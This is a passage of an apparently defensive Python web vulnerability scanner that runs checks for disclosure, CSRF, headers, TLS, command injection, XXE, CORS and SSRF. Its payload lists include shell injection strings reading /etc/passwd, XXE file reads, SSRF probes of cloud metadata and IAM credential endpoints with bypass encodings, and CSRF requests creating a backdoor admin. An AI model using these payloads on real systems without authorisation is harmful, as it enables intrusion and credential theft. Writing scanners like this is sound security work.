             False, VulnerabilityLevel.HIGH),
            ("Server Version Banner", "/", "GET",
             [], True, VulnerabilityLevel.LOW),
            ("Directory Listing", "/static/", "GET",
             ["index of /", "parent directory", "<a href=\"../\""],
             False, VulnerabilityLevel.MEDIUM),
            ("Swagger UI Exposed", "/docs", "GET",
             ["swagger-ui", "openapi", "\"paths\":", "\"components\":"],
             False, VulnerabilityLevel.LOW),
            ("Actuator Endpoints", "/actuator/env", "GET",
             ["propertysources", "systemproperties", "systemenv"],
             False, VulnerabilityLevel.HIGH),
            ("Actuator Health", "/actuator/health", "GET",
             ["diskspace", "db", "redis", "status"],
             False, VulnerabilityLevel.LOW),
            ("AWS Metadata via SSRF", "/api/fetch/?url=http://169.254.169.254/latest/meta-data/", "GET",
             ["ami-id", "instance-id", "local-ipv4", "iam"],
             False, VulnerabilityLevel.CRITICAL),
        ]

        async with SecurityHTTPClient(config) as client:
            for description, endpoint, method, patterns, check_headers, severity in disclosure_checks:
                test_id = f"{scan_id}-info-{uuid.uuid4().hex[:16]}"
                resp = None
                elapsed = 0.0
                t0 = time.time()
                try:
                    resp = await client.make_async_request(method, endpoint)
                    elapsed = time.time() - t0
                    code = getattr(resp, "status", 0)
                    body = getattr(resp, "text_content", "")
                    body_lower = body.lower()
                    headers = getattr(resp, "headers", {})

                    if check_headers:
                        # Server version banner check
                        server = headers.get("server", "").lower()
                        x_powered = headers.get("x-powered-by", "").lower()
                        leaked = []
                        for val, label in [(server, "Server"), (x_powered, "X-Powered-By")]:
                            if val and any(v in val for v in [
                                "apache/", "nginx/", "iis/", "php/", "express/",
                                "tomcat/", "jetty/", "gunicorn/", "werkzeug/",
                            ]):
                                leaked.append(f"{label}: {val}")
                        if leaked:
                            status = TestStatus.VULNERABLE
                            level = severity
                            details = f"Version info leaked in response headers: {'; '.join(leaked)}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = "No version info leaked in response headers"

                    elif code in (401, 403, 404):
                        status = TestStatus.PASSED
                        level = None
                        details = f"Endpoint properly protected ({code}): {description}"

                    elif code == 200 and patterns:
                        found = [p for p in patterns if p in body_lower]
                        if found:
                            status = TestStatus.VULNERABLE
                            level = severity
                            details = f"Sensitive content exposed at {endpoint} — matched: {found[:5]}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Endpoint accessible but no sensitive patterns matched: {description}"

                    elif code == 200 and not patterns:
                        # Binary/archive endpoint — accessible is itself a finding
                        status = TestStatus.VULNERABLE
                        level = severity
                        details = f"Sensitive file accessible at {endpoint} ({len(body)} bytes)"

                    else:
                        status = TestStatus.PASSED
                        level = None
                        details = f"No disclosure detected at {endpoint} ({code})"

                except Exception as e:
                    status, level, details = TestStatus.ERROR, None, str(e)

                results.append(TestResult(
                    id=test_id,
                    category="Information Disclosure",
                    test_name=description,
                    status=status,
                    vulnerability_level=level,
                    target_url=urljoin(config.target_url, endpoint),
                    method=method,
                    response_code=getattr(resp, "status", None),
                    response_time=elapsed,
                    service_name="scanner",
                    details=details,
                    recommendations="Disable debug mode in production; restrict access to config/backup files; suppress server version headers; implement proper error pages",
                ))

        return results

    # ------------------------------------------------------------------
    # CSRF Protection
    # Sends state-changing requests with cross-origin headers and
    # invalid/missing CSRF tokens. Confirms protection is enforced.
    # ------------------------------------------------------------------

    async def _test_csrf_protection(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        csrf_targets = [
            ("/api/users/profile/", "POST",
             {"name": "csrf_attacker", "email": "attacker@evil.com"}),
            ("/api/auth/password/change/", "POST",
             {"old_password": "anything", "new_password": "hacked123"}),
            ("/api/settings/", "PUT",
             {"notification_email": "attacker@evil.com"}),
            ("/api/users/delete/", "DELETE", None),
            ("/api/auth/logout/", "POST", {}),
            ("/api/admin/users/", "POST",
             {"username": "backdoor", "role": "admin", "password": "hacked"}),
        ]

        # Test matrix: (token_scenario, headers_to_send)
        token_scenarios = [
            ("No CSRF Token", {
                "Origin": "https://evil.com",
                "Referer": "https://evil.com/attack.html",
            }),
            ("Invalid CSRF Token", {
                "Origin": "https://evil.com",
                "Referer": "https://evil.com/attack.html",
                "X-CSRFToken": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "X-XSRF-TOKEN": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            }),
            ("Empty CSRF Token", {
                "Origin": "https://evil.com",
                "Referer": "https://evil.com/attack.html",
                "X-CSRFToken": "",
            }),
            ("Cross-Origin No Referer", {
                "Origin": "https://evil.com",
            }),
        ]

        async with SecurityHTTPClient(config) as client:
            for endpoint, method, json_body in csrf_targets:
                for scenario_name, extra_headers in token_scenarios:
                    test_id = f"{scan_id}-csrf-{uuid.uuid4().hex[:16]}"
                    resp = None
                    elapsed = 0.0
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            method, endpoint,
                            json_body=json_body,
                            headers=extra_headers,
                            inject_as="json" if json_body else "query",
                        )
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        body = getattr(resp, "text_content", "").lower()

                        csrf_blocked = (
                            code in (400, 403)
                            or "csrf" in body
                            or "forbidden" in body
                            or "invalid token" in body
                            or "token mismatch" in body
                            or "origin not allowed" in body
                        )

                        if csrf_blocked:
                            status = TestStatus.PASSED
                            level = None
                            details = f"CSRF protection active ({code}) — {scenario_name} on {method} {endpoint}"
                        elif code == 404:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Endpoint not found: {endpoint}"
                        elif code == 401:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Authentication required before CSRF check: {endpoint}"
                        elif code in (200, 201, 204):
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.HIGH
                            details = (
                                f"CSRF protection missing — {scenario_name} accepted on "
                                f"{method} {endpoint} ({code})"
                            )
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Response {code} for {scenario_name} on {method} {endpoint}"

                    except Exception as e:
                        status, level, details = TestStatus.ERROR, None, str(e)

                    results.append(TestResult(
                        id=test_id,
                        category="CSRF Protection",
                        test_name=f"{scenario_name} — {method} {endpoint}",
                        status=status,
                        vulnerability_level=level,
                        target_url=urljoin(config.target_url, endpoint),
                        method=method,
                        payload=scenario_name,
                        response_code=getattr(resp, "status", None),
                        response_time=elapsed,
                        service_name="scanner",
                        details=details,
                        recommendations="Use SameSite=Strict cookies; validate CSRF tokens server-side; check Origin/Referer headers; use double-submit cookie pattern",
                    ))

        return results

    # ------------------------------------------------------------------
    # Security Headers
    # Checks all OWASP-recommended headers with value validation.
    # ------------------------------------------------------------------

    async def _test_security_headers(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        async with SecurityHTTPClient(config) as client:
            try:
                resp = await client.make_async_request("GET", "/")
                headers = getattr(resp, "headers", {})
                # Normalise to lowercase keys
                h = {k.lower(): v for k, v in headers.items()}
            except Exception as e:
                results.append(TestResult(
                    id=f"{scan_id}-headers-fetch",
                    category="Security Headers",
                    test_name="Fetch Headers",
                    status=TestStatus.ERROR,
                    target_url=config.target_url,
                    method="GET",
                    service_name="scanner",
                    details=str(e),
                ))
                return results

        header_checks = [
            # (test_name, header_key, required_values_any, forbidden_values, severity, recommendation)
            ("X-Content-Type-Options", "x-content-type-options",
             ["nosniff"], [],
             VulnerabilityLevel.MEDIUM,
             "Set X-Content-Type-Options: nosniff to prevent MIME sniffing"),
            ("X-Frame-Options", "x-frame-options",
             ["deny", "sameorigin"], [],
             VulnerabilityLevel.MEDIUM,
             "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking"),
            ("Strict-Transport-Security", "strict-transport-security",
             ["max-age="], ["max-age=0"],
             VulnerabilityLevel.HIGH,
             "Set HSTS with max-age >= 31536000; include subdomains; consider preload"),
            ("Content-Security-Policy", "content-security-policy",
             ["default-src", "script-src"], ["unsafe-inline", "unsafe-eval"],
             VulnerabilityLevel.HIGH,
             "Implement a strict CSP; avoid unsafe-inline and unsafe-eval"),
            ("Referrer-Policy", "referrer-policy",
             ["no-referrer", "strict-origin", "same-origin"], [],
             VulnerabilityLevel.LOW,
             "Set Referrer-Policy to no-referrer or strict-origin-when-cross-origin"),
            ("Permissions-Policy", "permissions-policy",
             ["camera=", "microphone=", "geolocation="], [],
             VulnerabilityLevel.LOW,
             "Set Permissions-Policy to restrict browser feature access"),
            ("X-XSS-Protection", "x-xss-protection",
             ["1; mode=block", "0"], [],
             VulnerabilityLevel.LOW,
             "Set X-XSS-Protection: 1; mode=block (or 0 if CSP is in place)"),
            ("Cache-Control on Auth", "cache-control",
             ["no-store", "no-cache"], [],
             VulnerabilityLevel.MEDIUM,
             "Set Cache-Control: no-store on authenticated responses"),
        ]

        for test_name, header_key, required_any, forbidden, severity, recommendation in header_checks:
            test_id = f"{scan_id}-hdr-{uuid.uuid4().hex[:16]}"
            value = h.get(header_key, "")

            if not value:
                status = TestStatus.VULNERABLE
                level = severity
                details = f"Header '{header_key}' is missing"
            elif forbidden and any(f in value.lower() for f in forbidden):
                status = TestStatus.VULNERABLE
                level = severity
                details = f"Header '{header_key}' has insecure value: {value}"
            elif required_any and not any(r in value.lower() for r in required_any):
                status = TestStatus.VULNERABLE
                level = severity
                details = f"Header '{header_key}' present but value is weak: {value}"
            else:
                status = TestStatus.PASSED
                level = None
                details = f"Header '{header_key}' correctly set: {value}"

            results.append(TestResult(
                id=test_id,
                category="Security Headers",
                test_name=test_name,
                status=status,
                vulnerability_level=level,
                target_url=config.target_url,
                method="GET",
                service_name="scanner",
                details=details,
                recommendations=recommendation,
            ))

        # Check for dangerous headers that should NOT be present
        dangerous_present = [
            ("X-Powered-By", "x-powered-by",
             "Reveals technology stack — remove this header"),
            ("Server Version", "server",
             "Server header reveals version info — suppress or genericise"),
            ("X-AspNet-Version", "x-aspnet-version",
             "Reveals ASP.NET version — remove this header"),
            ("X-AspNetMvc-Version", "x-aspnetmvc-version",
             "Reveals ASP.NET MVC version — remove this header"),
        ]
        for test_name, header_key, recommendation in dangerous_present:
            test_id = f"{scan_id}-hdr-leak-{uuid.uuid4().hex[:16]}"
            value = h.get(header_key, "")
            if value:
                status = TestStatus.VULNERABLE
                level = VulnerabilityLevel.LOW
                details = f"Information-leaking header present: {header_key}: {value}"
            else:
                status = TestStatus.PASSED
                level = None
                details = f"Header '{header_key}' not present (good)"

            results.append(TestResult(
                id=test_id,
                category="Security Headers",
                test_name=test_name,
                status=status,
                vulnerability_level=level,
                target_url=config.target_url,
                method="GET",
                service_name="scanner",
                details=details,
                recommendations=recommendation,
            ))

        return results

    # ------------------------------------------------------------------
    # SSL/TLS Security
    # Real socket-level protocol negotiation + certificate inspection.
    # Tests: weak protocols, weak ciphers, cert validity, HSTS, mixed content.
    # ------------------------------------------------------------------

    async def _test_ssl_tls(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []
        parsed = urlparse(config.target_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        if parsed.scheme != "https":
            results.append(TestResult(
                id=f"{scan_id}-ssl-no-https",
                category="SSL/TLS Security",
                test_name="HTTPS Not Used",
                status=TestStatus.VULNERABLE,
                vulnerability_level=VulnerabilityLevel.HIGH,
                target_url=config.target_url,
                method="N/A",
                service_name="scanner",
                details="Target is not using HTTPS — all traffic transmitted in plaintext",
                recommendations="Enforce HTTPS site-wide; redirect all HTTP to HTTPS; obtain a valid TLS certificate",
            ))
            return results

        loop = asyncio.get_event_loop()

        # --- 1. Weak protocol negotiation ---
        weak_proto_tests = [
            ("TLSv1.0", ssl.TLSVersion.TLSv1),
            ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
        ]
        for proto_name, max_ver in weak_proto_tests:
            test_id = f"{scan_id}-ssl-proto-{proto_name.lower().replace('.', '')}"
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.maximum_version = max_ver
                connected = await loop.run_in_executor(
                    None, lambda c=ctx: _ssl_connect(host, port, c)
                )
                if connected:
                    status = TestStatus.VULNERABLE
                    level = VulnerabilityLevel.HIGH
                    details = f"Deprecated protocol {proto_name} accepted — POODLE/BEAST attacks possible"
                else:
                    status = TestStatus.PASSED
                    level = None
                    details = f"Deprecated protocol {proto_name} correctly rejected"
            except Exception as e:
                status = TestStatus.PASSED
                level = None
                details = f"Protocol {proto_name} not negotiable: {e}"

            results.append(TestResult(
                id=test_id,
                category="SSL/TLS Security",
                test_name=f"Weak Protocol {proto_name}",
                status=status,
                vulnerability_level=level,
                target_url=config.target_url,
                method="N/A",
                service_name="scanner",
                details=details,
                recommendations=f"Disable {proto_name}; support only TLS 1.2 and TLS 1.3",
            ))

        # --- 2. Weak cipher suites ---
        weak_ciphers = [
            "RC4-SHA", "RC4-MD5", "DES-CBC3-SHA", "EXP-RC4-MD5",
            "NULL-SHA", "NULL-MD5", "ADH-AES256-SHA",
        ]
        test_id = f"{scan_id}-ssl-ciphers"
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers(":".join(weak_ciphers))
            connected = await loop.run_in_executor(
                None, lambda: _ssl_connect(host, port, ctx)
            )
            if connected:
                status = TestStatus.VULNERABLE
                level = VulnerabilityLevel.HIGH
                details = "Server accepts weak cipher suites (RC4/DES/NULL/EXPORT)"
            else:
                status = TestStatus.PASSED
                level = None
                details = "Weak cipher suites correctly rejected"
        except ssl.SSLError:
            status = TestStatus.PASSED
            level = None
            details = "Weak cipher suites not supported (good)"
        except Exception as e:
            status = TestStatus.ERROR
            level = None
            details = f"Cipher test failed: {e}"

        results.append(TestResult(
            id=test_id,
            category="SSL/TLS Security",
            test_name="Weak Cipher Suites",
            status=status,
            vulnerability_level=level,
            target_url=config.target_url,
            method="N/A",
            service_name="scanner",
            details=details,
            recommendations="Disable RC4, DES, NULL, and EXPORT cipher suites; prefer ECDHE+AES-GCM",
        ))

        # --- 3. Certificate validity, expiry, self-signed ---
        cert_test_id = f"{scan_id}-ssl-cert"
        try:
            ctx = ssl.create_default_context()
            cert_info = await loop.run_in_executor(
                None, lambda: _get_cert_info(host, port, ctx)
            )
            if cert_info.get("expired"):
                status = TestStatus.VULNERABLE
                level = VulnerabilityLevel.CRITICAL
                details = f"SSL certificate has expired: {cert_info.get('not_after')}"
            elif cert_info.get("self_signed"):
                status = TestStatus.VULNERABLE
                level = VulnerabilityLevel.HIGH
                details = f"Self-signed certificate detected (issuer == subject: {cert_info.get('subject_cn')})"
            elif cert_info.get("expiring_soon"):
                days = cert_info.get("days_remaining", 0)
                status = TestStatus.VULNERABLE
                level = VulnerabilityLevel.MEDIUM
                details = f"Certificate expiring in {days} days: {cert_info.get('not_after')}"
            else:
                status = TestStatus.PASSED
                level = None
                details = f"Certificate valid — expires {cert_info.get('not_after')} ({cert_info.get('days_remaining')} days)"
        except ssl.SSLCertVerificationError as e:
            status = TestStatus.VULNERABLE
            level = VulnerabilityLevel.HIGH
            details = f"Certificate verification failed: {e}"
        except Exception as e:
            status = TestStatus.ERROR
            level = None
            details = f"Certificate check failed: {e}"

        results.append(TestResult(
            id=cert_test_id,
            category="SSL/TLS Security",
            test_name="Certificate Validity",
            status=status,
            vulnerability_level=level,
            target_url=config.target_url,
            method="N/A",
            service_name="scanner",
            details=details,
            recommendations="Use a CA-signed certificate; automate renewal with Let's Encrypt; monitor expiry",
        ))

        # --- 4. HSTS header presence and strength ---
        hsts_test_id = f"{scan_id}-ssl-hsts"
        try:
            async with SecurityHTTPClient(config) as client:
                resp = await client.make_async_request("GET", "/")
                h = {k.lower(): v for k, v in getattr(resp, "headers", {}).items()}
                hsts = h.get("strict-transport-security", "")

            if not hsts:
                status = TestStatus.VULNERABLE
                level = VulnerabilityLevel.MEDIUM
                details = "HSTS header missing — HTTP downgrade attacks possible"
            elif "max-age=0" in hsts:
                status = TestStatus.VULNERABLE
                level = VulnerabilityLevel.MEDIUM
                details = "HSTS max-age=0 effectively disables HSTS"
            else:
                # Parse max-age value
                import re
                m = re.search(r"max-age=(\d+)", hsts)
                max_age = int(m.group(1)) if m else 0
                if max_age < 31536000:
                    status = TestStatus.VULNERABLE
                    level = VulnerabilityLevel.LOW
                    details = f"HSTS max-age too short ({max_age}s) — recommend >= 31536000"
                else:
                    status = TestStatus.PASSED
                    level = None
                    details = f"HSTS properly configured: {hsts}"
        except Exception as e:
            status = TestStatus.ERROR
            level = None
            details = f"HSTS check failed: {e}"

        results.append(TestResult(
            id=hsts_test_id,
            category="SSL/TLS Security",
            test_name="HSTS Header",
            status=status,
            vulnerability_level=level,
            target_url=config.target_url,
            method="GET",
            service_name="scanner",
            details=details,
            recommendations="Set HSTS max-age >= 31536000; add includeSubDomains; submit to HSTS preload list",
        ))

        # --- 5. HTTP to HTTPS redirect ---
        redirect_test_id = f"{scan_id}-ssl-redirect"
        http_url = config.target_url.replace("https://", "http://", 1)
        try:
            import aiohttp
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(http_url, allow_redirects=False, ssl=False) as resp:
                    code = resp.status
                    location = resp.headers.get("location", "")
            if code in (301, 302, 307, 308) and "https://" in location.lower():
                status = TestStatus.PASSED
                level = None
                details = f"HTTP correctly redirects to HTTPS ({code} → {location})"
            else:
                status = TestStatus.VULNERABLE
                level = VulnerabilityLevel.MEDIUM
                details = f"HTTP does not redirect to HTTPS — response was {code}"
        except Exception as e:
            status = TestStatus.ERROR
            level = None
            details = f"HTTP redirect check failed: {e}"

        results.append(TestResult(
            id=redirect_test_id,
            category="SSL/TLS Security",
            test_name="HTTP to HTTPS Redirect",
            status=status,
            vulnerability_level=level,
            target_url=http_url,
            method="GET",
            service_name="scanner",
            details=details,
            recommendations="Redirect all HTTP traffic to HTTPS with a 301 permanent redirect",
        ))

        return results

    # ------------------------------------------------------------------
    # A03 — OS Command Injection
    # Injects shell metacharacters into parameters that may reach exec()
    # ------------------------------------------------------------------

    async def _test_command_injection(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        payloads = [
            # Unix command separators
            "; id", "& id", "| id", "`id`", "$(id)",
            "; whoami", "& whoami", "| whoami",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; ls -la", "& ls -la",
            # Time-based blind (sleep)
            "; sleep 5", "& sleep 5", "| sleep 5",
            "$(sleep 5)", "`sleep 5`",
            # Windows
            "& whoami", "| whoami", "& dir", "| dir",
            "& type C:\\windows\\win.ini",
            # Encoded
            "%3B id", "%7C id", "%26 id",
            "%0a id", "%0d%0a id",
            # Nested
            "$($(id))", "`$(id)`",
        ]

        targets = [
            ("/api/ping/",    "host",    "GET",  "query"),
            ("/api/lookup/",  "domain",  "GET",  "query"),
            ("/api/resolve/", "host",    "GET",  "query"),
            ("/api/exec/",    "cmd",     "GET",  "query"),
            ("/api/run/",     "command", "POST", "json"),
            ("/api/convert/", "file",    "POST", "json"),
            ("/api/export/",  "format",  "GET",  "query"),
        ]

        ic = config.get_intensity_config()
        if ic["max_payloads"]:
            payloads = payloads[: ic["max_payloads"]]

        async with SecurityHTTPClient(config) as client:
            for endpoint, field, method, inject_as in targets:
                for payload in payloads:
                    test_id = f"{scan_id}-cmdi-{uuid.uuid4().hex[:16]}"
                    resp = None
                    elapsed = 0.0
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            method, endpoint, payload,
                            inject_as=inject_as, field_name=field,
                        )
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        body = getattr(resp, "text_content", "").lower()

                        if code == 403 or "blocked" in body or "waf" in body:
                            status = TestStatus.BLOCKED
                            level = None
                            details = "Command injection attempt blocked"
                        elif any(i in body for i in [
                            "uid=", "root:", "www-data", "daemon:",
                            "bin/bash", "bin/sh", "/etc/passwd",
                            "volume serial", "directory of",
                            "windows ip configuration",
                        ]):
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.CRITICAL
                            details = f"OS command injection confirmed — shell output in response: {payload[:50]}"
                        elif "sleep" in payload.lower() and elapsed >= 4.5:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.HIGH
                            details = f"Blind command injection — response delayed {elapsed:.1f}s: {payload[:50]}"
                        elif code == 500:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.MEDIUM
                            details = f"Server error on command injection payload: {payload[:50]}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = "No command injection indicator detected"

                    except Exception as e:
                        status, level, details = TestStatus.ERROR, None, str(e)

                    results.append(TestResult(
                        id=test_id,
                        category="Command Injection",
                        test_name=f"CMDi {method} {endpoint} [{field}]",
                        status=status,
                        vulnerability_level=level,
                        target_url=urljoin(config.target_url, endpoint),
                        method=method,
                        payload=payload,
                        response_code=getattr(resp, "status", None),
                        response_time=elapsed,
                        service_name="scanner",
                        details=details,
                        recommendations="Never pass user input to shell commands; use subprocess with argument lists; whitelist allowed values",
                    ))

        return results

    # ------------------------------------------------------------------
    # A03 — XXE Injection (XML External Entity)
    # ------------------------------------------------------------------

    async def _test_xxe_injection(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        xxe_payloads = [
            # Classic file read
            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
             "Classic XXE /etc/passwd"),
            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><x>&xxe;</x>',
             "Classic XXE /etc/hosts"),
            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><x>&xxe;</x>',
             "Classic XXE win.ini"),
            # SSRF via XXE
            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>',
             "XXE SSRF AWS metadata"),
            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:22/">]><x>&xxe;</x>',
             "XXE SSRF internal port scan"),
            # Blind XXE via parameter entity
            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><x>test</x>',
             "Blind XXE parameter entity"),
            # Billion laughs DoS
            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "dos"><!ENTITY b "&a;&a;&a;&a;&a;">]><x>&b;</x>',
             "XXE Billion Laughs (DoS)"),
            # XInclude
            ('<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>',
             "XInclude file read"),
        ]

        xml_endpoints = [
            ("/api/xml/",       "POST"),
            ("/api/import/",    "POST"),
            ("/api/upload/",    "POST"),
            ("/api/parse/",     "POST"),
            ("/api/convert/",   "POST"),
            ("/api/feed/",      "POST"),
            ("/api/webhook/",   "POST"),
            ("/api/soap/",      "POST"),
        ]

        ic = config.get_intensity_config()
        if ic["max_payloads"]:
            xxe_payloads = xxe_payloads[: ic["max_payloads"]]

        async with SecurityHTTPClient(config) as client:
            for endpoint, method in xml_endpoints:
                for payload, description in xxe_payloads:
                    test_id = f"{scan_id}-xxe-{uuid.uuid4().hex[:16]}"
                    resp = None
                    elapsed = 0.0
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            method, endpoint,
                            raw_body=payload.encode(),
                            headers={"Content-Type": "application/xml"},
                        )
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        body = getattr(resp, "text_content", "").lower()

                        if code == 403 or "blocked" in body:
                            status = TestStatus.BLOCKED
                            level = None
                            details = f"XXE attempt blocked: {description}"
                        elif any(i in body for i in [
                            "root:x:", "daemon:x:", "/bin/bash",
                            "[boot loader]", "[fonts]",
                            "ami-id", "instance-id",
                        ]):
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.CRITICAL
                            details = f"XXE confirmed — file/SSRF content in response: {description}"
                        elif code == 404:
                            status = TestStatus.PASSED
                            level = None
                            details = f"XML endpoint not found: {endpoint}"
                        elif code == 500:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.MEDIUM
                            details = f"Server error on XXE payload — possible blind XXE: {description}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"No XXE indicator: {description}"

                    except Exception as e:
                        status, level, details = TestStatus.ERROR, None, str(e)

                    results.append(TestResult(
                        id=test_id,
                        category="XXE Injection",
                        test_name=f"{description} → {endpoint}",
                        status=status,
                        vulnerability_level=level,
                        target_url=urljoin(config.target_url, endpoint),
                        method=method,
                        payload=payload[:100],
                        response_code=getattr(resp, "status", None),
                        response_time=elapsed,
                        service_name="scanner",
                        details=details,
                        recommendations="Disable external entity processing in XML parsers; use JSON where possible; validate and sanitize XML input",
                    ))

        return results

    # ------------------------------------------------------------------
    # A05 — CORS Misconfiguration
    # ------------------------------------------------------------------

    async def _test_cors(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        evil_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "https://evil.binarymisfits.info",  # subdomain of target
            "https://notbinarymisfits.info",     # typosquat
            "http://localhost",
            "https://localhost",
        ]

        probe_endpoints = [
            "/api/", "/api/v1/", "/api/users/",
            "/api/auth/", "/api/admin/", "/",
        ]

        async with SecurityHTTPClient(config) as client:
            for endpoint in probe_endpoints:
                for origin in evil_origins:
                    test_id = f"{scan_id}-cors-{uuid.uuid4().hex[:16]}"
                    resp = None
                    elapsed = 0.0
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            "GET", endpoint,
                            headers={"Origin": origin},
                        )
                        elapsed = time.time() - t0
                        h = {k.lower(): v for k, v in getattr(resp, "headers", {}).items()}
                        acao = h.get("access-control-allow-origin", "")
                        acac = h.get("access-control-allow-credentials", "").lower()

                        if not acao:
                            status = TestStatus.PASSED
                            level = None
                            details = f"No CORS header returned for origin: {origin}"
                        elif acao == "*" and acac == "true":
                            # Browsers block this combo but it's still a misconfiguration
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.HIGH
                            details = f"CORS wildcard + credentials=true (invalid but misconfigured): {origin}"
                        elif acao == "*":
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.MEDIUM
                            details = f"CORS wildcard (*) — any origin allowed on {endpoint}"
                        elif acao == origin and acac == "true":
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.CRITICAL
                            details = f"CORS reflects arbitrary origin + credentials=true — cross-origin authenticated requests possible: {origin}"
                        elif acao == origin:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.HIGH
                            details = f"CORS reflects arbitrary origin without validation: {origin}"
                        elif acao == "null" and origin == "null":
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.HIGH
                            details = "CORS allows null origin — sandbox iframe attacks possible"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"CORS correctly restricted. ACAO: {acao}"

                    except Exception as e:
                        status, level, details = TestStatus.ERROR, None, str(e)

                    results.append(TestResult(
                        id=test_id,
                        category="CORS Misconfiguration",
                        test_name=f"CORS {endpoint} ← {origin}",
                        status=status,
                        vulnerability_level=level,
                        target_url=urljoin(config.target_url, endpoint),
                        method="GET",
                        payload=f"Origin: {origin}",
                        response_code=getattr(resp, "status", None),
                        response_time=elapsed,
                        service_name="scanner",
                        details=details,
                        recommendations="Validate Origin against an explicit allowlist; never reflect arbitrary origins; never combine wildcard with credentials=true",
                    ))

        return results

    # ------------------------------------------------------------------
    # A10 — SSRF (Server-Side Request Forgery)
    # ------------------------------------------------------------------

    async def _test_ssrf(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        ssrf_payloads = [
            # Cloud metadata
            ("http://169.254.169.254/latest/meta-data/",          "AWS IMDSv1 metadata"),
            ("http://169.254.169.254/latest/meta-data/iam/",      "AWS IAM credentials"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
            ("http://169.254.169.254/metadata/instance",          "Azure IMDS"),
            ("http://100.100.100.200/latest/meta-data/",          "Alibaba Cloud metadata"),
            # Internal services
            ("http://localhost/",                                  "SSRF localhost"),
            ("http://127.0.0.1/",                                  "SSRF 127.0.0.1"),
            ("http://0.0.0.0/",                                    "SSRF 0.0.0.0"),
            ("http://[::1]/",                                      "SSRF IPv6 loopback"),
            ("http://localhost:22/",                               "SSRF SSH port"),
            ("http://localhost:3306/",                             "SSRF MySQL port"),
            ("http://localhost:5432/",                             "SSRF PostgreSQL port"),
            ("http://localhost:6379/",                             "SSRF Redis port"),
            ("http://localhost:27017/",                            "SSRF MongoDB port"),
            ("http://localhost:8080/",                             "SSRF internal HTTP"),
            # Bypass techniques
            ("http://2130706433/",                                 "SSRF decimal IP (127.0.0.1)"),
            ("http://0x7f000001/",                                 "SSRF hex IP (127.0.0.1)"),
            ("http://127.1/",                                      "SSRF short IP"),
            ("http://127.0.1/",                                    "SSRF short IP variant"),
            ("http://[0:0:0:0:0:ffff:127.0.0.1]/",               "SSRF IPv6 mapped"),
            ("dict://localhost:6379/info",                         "SSRF Redis via dict://"),
            ("gopher://localhost:6379/_INFO",                      "SSRF Redis via gopher://"),
            ("file:///etc/passwd",                                 "SSRF file:// protocol"),
        ]

        # Endpoints that commonly accept URLs as parameters
        ssrf_targets = [
            ("/api/fetch/",    "url",      "GET",  "query"),
            ("/api/proxy/",    "url",      "GET",  "query"),
            ("/api/request/",  "url",      "GET",  "query"),
            ("/api/webhook/",  "url",      "POST", "json"),
            ("/api/import/",   "url",      "POST", "json"),
            ("/api/preview/",  "url",      "GET",  "query"),
